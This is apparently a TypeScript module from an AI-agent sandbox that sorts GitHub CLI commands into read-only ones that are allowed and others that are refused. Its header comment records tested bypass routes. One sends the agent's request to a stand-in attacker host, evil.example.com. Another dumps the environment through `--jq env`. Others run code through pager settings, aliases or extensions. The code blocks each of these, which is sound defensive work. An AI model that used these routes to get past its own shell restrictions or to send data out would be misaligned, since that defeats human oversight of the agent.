// enclawed adapter kit: the read-only forms of the GitHub CLI (gh), for the
// read-only shell allowlist (./shell-readonly.ts).
//
// Every option below was taken from `gh <command> <subcommand> --help` of gh
// 2.46.0 and is matched exactly (gh parses with pflag, which accepts no
// abbreviation of a long option). What was measured on that gh (env -i, an
// empty home, the network replaced by a local socket through
// http_unix_socket):
//
//   dispatch     a built-in command wins over an alias and over an extension
//                of the same name (an alias `repo: '!touch x'` and an
//                extension gh-repo did not run for `gh repo view`), but an
//                unknown word runs the extension or alias of that name. Only
//                the exact built-in command and subcommand names below are
//                read-only; anything else is not.
//   hosts        an explicit host (`gh repo view HOST/OWNER/REPO`, `-R
//                HOST/OWNER/REPO`, a URL) is contacted even when gh holds no
//                token for it: `gh repo view evil.example.com/o/r` posted to
//                https://evil.example.com/api/graphql, which carries what the
//                agent wrote in the request to a host anyone can run. An
//                explicit host other than github.com is refused. Without one,
//                gh contacts only the hosts it is logged in to (git remotes on
//                other hosts are ignored: "none of the git remotes ... point
//                to a known GitHub host") or the session's GH_HOST, which the
//                person set (a GH_* assignment on the line is refused by the
//                compound classifier, `env GH_HOST=...` by the env rule).
//   --jq         is evaluated by gh's embedded jq, which reads the
//                environment: `--jq env.HOME` and `--jq '$ENV.X'` printed it,
//                so the environment-dump rule would be bypassed. A jq
//                expression naming env or $ENV is refused (import / include
//                did not load a module there, and are refused too).
//                --template has no env function.
//   pager        config.yml `pager:` (and GH_PAGER / PAGER) runs a program
//                when stdout is a terminal (measured: `pager: touch x` ran
//                under a pseudo-terminal, not with stdout a pipe). A host may
//                give its shell a terminal, so gh's config directory is a file
//                that configures what runs later: writes there wait for a
//                person (./rule-decisions.ts, .config/gh and .local/share/gh),
//                and reads of it are a credential store (./credentials.ts).
//                browser, editor and prompt are used only by --web and the
//                interactive write commands, which are refused.
//   git          gh runs git (along PATH, checked by ./program-path.ts) to read
//                the repository's remotes and current branch; the repository's
//                git configuration is checked as for `git remote -v`.
//
// Refused: `gh api` (any method), auth token/login/logout/refresh/setup-git/
// switch, alias, extension, config, secret, variable, codespace, gist
// create/edit/delete, browse, every --web/-w, `auth status -t/--show-token`,
// `pr checks --watch` (runs until the checks finish), and every command or
// subcommand not listed.

import { parseOptions, spec, type OptionSpec } from "./shell-options.js";

const no = (detail: string): Readonly<{ ok: false; detail: string }> => ({ ok: false, detail });

// The JSON output options most read commands share: --json FIELDS with
// -q/--jq EXPR or -t/--template TEMPLATE.
const JSON_LONG = "jq json template";

function sub(o: {
  flags?: string;
  args?: string;
  long?: string;
  longArgs?: string;
  longOpt?: string;
  maxPos?: number;
}): OptionSpec {
  return spec({ ...o, long: `help ${o.long ?? ""}` });
}

// [command][subcommand] -> its read-only options. `-R/--repo` selects the
// repository ([HOST/]OWNER/REPO) except under `search`, where it is a filter
// sent to GitHub's search as a `repo:` qualifier.
const GH: Readonly<Record<string, Readonly<Record<string, OptionSpec>>>> = {
  auth: {
    // -t/--show-token prints the token: left out.
    status: sub({ args: "h", longArgs: "hostname", maxPos: 0 }),
  },
  repo: {
    view: sub({ args: "bqt", longArgs: `branch ${JSON_LONG}`, maxPos: 1 }),
    list: sub({
      args: "qlLt",
      long: "archived fork no-archived source",
      longArgs: `language limit topic visibility ${JSON_LONG}`,
      maxPos: 1,
    }),
  },
  pr: {
    list: sub({
      flags: "d",
      args: "aABHqlLSstR",
      long: "draft",
      longArgs: `app assignee author base head label limit search state repo ${JSON_LONG}`,
      maxPos: 0,
    }),
    view: sub({
      flags: "c",
      args: "qtR",
      long: "comments",
      longArgs: `repo ${JSON_LONG}`,
      maxPos: 1,
    }),
    status: sub({
      flags: "c",
      args: "qtR",
      long: "conflict-status",
      longArgs: `repo ${JSON_LONG}`,
      maxPos: 0,
    }),
    diff: sub({ args: "R", long: "name-only patch", longArgs: "color repo", maxPos: 1 }),
    checks: sub({ args: "R", long: "required", longArgs: "repo", maxPos: 1 }),
  },
  issue: {
    list: sub({
      args: "aAqlLmSstR",
      longArgs: `app assignee author label limit mention milestone search state repo ${JSON_LONG}`,
      maxPos: 0,
    }),
    view: sub({
      flags: "c",
      args: "qtR",
      long: "comments",
      longArgs: `repo ${JSON_LONG}`,
      maxPos: 1,
    }),
    status: sub({ args: "qtR", longArgs: `repo ${JSON_LONG}`, maxPos: 0 }),
  },
  run: {
    // Here -w is --workflow NAME (a filter), not --web.
    list: sub({
      args: "bceqLstuwR",
      longArgs: `branch commit created event limit status user workflow repo ${JSON_LONG}`,
      maxPos: 0,
    }),
    // --log / --log-failed print the run's logs (gh keeps the downloaded log
    // archive in its cache directory; nothing runs).
    view: sub({
      flags: "v",
      args: "ajqtR",
      long: "exit-status log log-failed verbose",
      longArgs: `attempt job repo ${JSON_LONG}`,
      maxPos: 1,
    }),
  },
  release: {
    list: sub({
      args: "qLOtR",
      long: "exclude-drafts exclude-pre-releases",
      longArgs: `limit order repo ${JSON_LONG}`,
      maxPos: 0,
    }),
    view: sub({ args: "qtR", longArgs: `repo ${JSON_LONG}`, maxPos: 1 }),
  },
  workflow: {
    list: sub({
      flags: "a",
      args: "qLtR",
      long: "all",
      longArgs: `limit repo ${JSON_LONG}`,
      maxPos: 0,
    }),
    view: sub({ flags: "y", args: "rR", long: "yaml", longArgs: "ref repo", maxPos: 1 }),
  },
  label: {
    list: sub({
      args: "qLStR",
      longArgs: `limit order search sort repo ${JSON_LONG}`,
      maxPos: 0,
    }),
  },
  gist: {
    list: sub({ args: "L", long: "public secret", longArgs: "limit", maxPos: 0 }),
    view: sub({ flags: "r", args: "f", long: "files raw", longArgs: "filename", maxPos: 1 }),
  },
  // The query words are sent to GitHub's search only.
  search: {
    repos: sub({
      args: "qLt",
      longArgs: `created followers forks good-first-issues help-wanted-issues include-forks language license limit match number-topics order owner size sort stars topic updated visibility ${JSON_LONG}`,
      longOpt: "archived",
    }),
    issues: sub({
      args: "qLRt",
      long: "include-prs locked no-assignee no-label no-milestone no-project",
      longArgs: `app assignee author closed commenter comments created interactions involves label language limit match mentions milestone order owner project reactions repo sort state team-mentions updated visibility ${JSON_LONG}`,
      longOpt: "archived",
    }),
    prs: sub({
      args: "BHqLRt",
      long: "draft locked merged no-assignee no-label no-milestone no-project",
      longArgs: `app assignee author base checks closed commenter comments created head interactions involves label language limit match mentions merged-at milestone order owner project reactions repo review review-requested reviewed-by sort state team-mentions updated visibility ${JSON_LONG}`,
      longOpt: "archived",
    }),
    code: sub({
      args: "qLRt",
      longArgs: `extension filename language limit match owner repo size ${JSON_LONG}`,
    }),
  },
};

// A jq expression that reads the environment (or would load a module).
const JQ_REFUSED = /\benv\b|\$ENV\b|\bimport\b|\binclude\b/;
const GITHUB_URL = /^https?:\/\/github\.com(?:[/?#]|$)/i;

/** A word that names a host: a URL, or scp-style `user@host:path`. Only github.com is accepted. */
function namesOtherHost(v: string): boolean {
  if (v.includes("://")) {
    return !GITHUB_URL.test(v);
  }
  return /^[^/]*@[^/]*:/.test(v);
}

/** A repository selector `[HOST/]OWNER/REPO`: a HOST other than github.com is refused. */
function repoOnOtherHost(v: string): boolean {
  if (v.includes("://")) {
    return namesOtherHost(v);
  }
  const parts = v.split("/");
  return parts.length >= 3 && parts[0].toLowerCase() !== "github.com";
}

export type GhVerdict =
  | Readonly<{ ok: true; repoScoped: boolean }>
  | Readonly<{ ok: false; detail: string }>;

/** Is `gh ARGS` one of the read-only forms (see the header)? */
export function ghReadOnly(args: readonly string[]): GhVerdict {
  if (args.length === 1 && (args[0] === "--version" || args[0] === "version")) {
    return { ok: true, repoScoped: false };
  }
  const [cmd, subcmd, ...rest] = args;
  const specs = cmd !== undefined && Object.hasOwn(GH, cmd) ? GH[cmd] : null;
  const s = specs && subcmd !== undefined && Object.hasOwn(specs, subcmd) ? specs[subcmd] : null;
  if (!s) {
    // An extension or an alias is dispatched by any other name.
    return no(`gh ${[cmd, subcmd].filter(Boolean).join(" ")} is not on the read-only list`);
  }
  const r = parseOptions(rest, s);
  if (!r.ok) {
    return no(`gh ${cmd} ${subcmd}: ${r.detail}`);
  }
  for (const o of r.options) {
    // pflag reads `-R=x` as the value x.
    const v = (o.value ?? "").replace(/^=/, "");
    if ((o.name === "-q" || o.name === "--jq") && JQ_REFUSED.test(v)) {
      return no(`gh --jq: an expression that reads the environment is not on the read-only list`);
    }
    if (namesOtherHost(v)) {
      return no(`gh ${cmd} ${subcmd}: ${o.name} names a host other than github.com`);
    }
    if ((o.name === "-R" || o.name === "--repo") && cmd !== "search" && repoOnOtherHost(v)) {
      return no(`gh ${cmd} ${subcmd}: ${o.name} names a host other than github.com`);
    }
  }
  for (const p of r.positionals) {
    if (namesOtherHost(p) || (cmd === "repo" && subcmd === "view" && repoOnOtherHost(p))) {
      return no(`gh ${cmd} ${subcmd}: ${p.slice(0, 80)} names a host other than github.com`);
    }
  }
  // Commands that read the current repository's git remotes when no -R is given.
  const repoScoped =
    !["auth", "search", "gist"].includes(cmd) && !(cmd === "repo" && subcmd === "list");
  return { ok: true, repoScoped };
}
